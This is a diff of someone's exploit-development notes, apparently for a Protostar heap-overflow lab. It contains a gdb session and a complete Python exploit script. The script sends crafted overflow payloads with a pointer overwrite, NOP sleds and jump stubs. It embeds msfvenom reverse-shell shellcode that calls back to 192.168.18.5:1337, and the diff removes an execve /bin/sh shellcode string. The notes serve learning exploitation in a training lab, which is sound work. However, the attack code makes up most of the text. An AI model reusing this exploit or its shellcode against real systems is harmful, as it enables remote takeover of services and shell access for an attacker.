@@ -256,7 +256,7 @@ s.connect((HOST, PORT))
 
 _WRITE=struct.pack("I", 0x804d41c-0xc)
 _HEAP=struct.pack("I", 0x804e020)
-_EXPLOIT="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
+_EXPLOIT="\xCC\xCC\xCC\xCC"
 _NOPS="\x90"*10
 
 def pad(_input, _char):
@@ -284,3 +284,112 @@ set pagination off
 
 break *0x0804bd40
 break *0x0804be13
+
+
+
+this means that next instruction to execute is at 0x0804e02a and is currently at 0x0804e029
+
+Program received signal SIGTRAP, Trace/breakpoint trap.
+0x0804e02a in ?? ()
+(gdb) c
+Continuing.
+
+
+
+
+
+
+
+
+
+
+
+$ cat ex.py
+import socket
+import struct
+import time
+import telnetlib
+
+HOST="127.0.0.1"
+PORT=2993
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((HOST, PORT))
+
+_WRITE=struct.pack("I", 0x804d41c-0xc)
+_HEAP=struct.pack("I", 0x804e014)
+
+# msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.18.5 LPORT=1337 -f python -e x86/shikata_ga_nai
+
+buf = "\xba\xdf\xb5\xbd\xee\xdb\xdd\xd9\x74\x24\xf4\x58\x33"
+buf += "\xc9\xb1\x12\x31\x50\x12\x03\x50\x12\x83\x37\x49\x5f"
+buf += "\x1b\xf6\x69\x57\x07\xab\xce\xcb\xa2\x49\x58\x0a\x82"
+buf += "\x2b\x97\x4d\x70\xea\x97\x71\xba\x8c\x91\xf4\xbd\xe4"
+buf += "\xe1\xaf\x2c\xf1\x89\xad\x50\xfc\x70\x3b\xb1\x4e\xe4"
+buf += "\x6b\x63\xfd\x5a\x88\x0a\xe0\x50\x0f\x5e\x8a\x04\x3f"
+buf += "\x2c\x22\xb1\x10\xfd\xd0\x28\xe6\xe2\x46\xf8\x71\x05"
+buf += "\xd6\xf5\x4c\x46"
+
+
+# msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 LPORT=1337 -f python -e x86/shikata_ga_nai
+
+buf = "\xdb\xcf\xb8\x5c\x20\x9f\x3f\xd9\x74\x24\xf4\x5d\x29"
+buf += "\xc9\xb1\x12\x31\x45\x17\x83\xed\xfc\x03\x19\x33\x7d"
+buf += "\xca\x90\xe8\x76\xd6\x81\x4d\x2a\x73\x27\xdb\x2d\x33"
+buf += "\x41\x16\x2d\xa7\xd4\x18\x11\x05\x66\x11\x17\x6c\x0e"
+buf += "\xdd\xe7\x8e\xcf\x49\xea\x8e\xca\xb0\x63\x6f\x64\xa4"
+buf += "\x23\x21\xd7\x9a\xc7\x48\x36\x11\x47\x18\xd0\xc4\x67"
+buf += "\xee\x48\x71\x57\x3f\xea\xe8\x2e\xdc\xb8\xb9\xb9\xc2"
+buf += "\x8c\x35\x77\x84"
+
+INTERRUPT = "\xCC"
+
+NOP_SLED_1 = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+JMP_0XC = "\xeb\x0a" # obtained from tutorial, jmp 0xc addresses from current address at 0x804e014 to 0x804e020
+
+NOP_SLED_2 = "\x90\x90\x90\x90\x90"
+MOV_JMP_EAX_0x804e020 = "\xB8\x20\xE0\x04\x08\xFF\xE0"
+MOV_JMP_EAX_0x804e098 = "\xB8\x98\xE0\x04\x08\xFF\xE0"
+MOV_CALL_EAX_0x804e098 = "\xB8\x98\xE0\x04\x08\xFF\xD0"
+
+def pad(_input, _char):
+    temp = "FSRD" + _input
+    return temp + (128 - len(temp)) * _char
+
+PAYLOAD_1_1 = pad("/ROOT/AA" + JMP_0XC + NOP_SLED_1 + buf, "/")
+PAYLOAD_1_2 = pad("/ROOT/AA" + MOV_CALL_EAX_0x804e098 + NOP_SLED_2 + buf, "/")
+
+PAYLOAD_2_1 = pad("ROOT/" + "\xfc\xff\xff\xff" + "\xfc\xff\xff\xff" + _WRITE + _HEAP, "\x00")
+PAYLOAD_2_2 = pad("ROOT/" + "\xfc\xff\xff\xff" + "\xfc\xff\xff\xff" + _WRITE + _HEAP + buf + "\x00\x00\x00\x00", "\x00")
+
+s.send(PAYLOAD_1_2)
+s.send(PAYLOAD_2_2)
+
+
+#t = telnetlib.Telnet()
+#t.sock = s
+#t.interact()
+
+
+https://stackoverflow.com/questions/775108/x86-jump-to-an-address
+
+https://73696e65.github.io/2015/07/exploit-exercises-protostar-final-levels
+
+https://cocomelonc.github.io/pwn/2021/10/19/buffer-overflow-1.html
+
+https://stackoverflow.com/questions/775108/x86-jump-to-an-address
+
+when u do mov eax, 0xasdasdasd
+jmp eax or jmp [eax]
+
+it will jmp and interpret the value 0xasdasdasd as a memory location/pointer
+
+try mov eax, [0xasdasdasd]
+
+"\xB8\x14\xE0\x04\x08"
+
+"\xA1\x14\xE0\x04\x08"
+
+https://stackoverflow.com/questions/2030366/what-do-the-brackets-mean-in-nasm-syntax-for-x86-asm
+
+
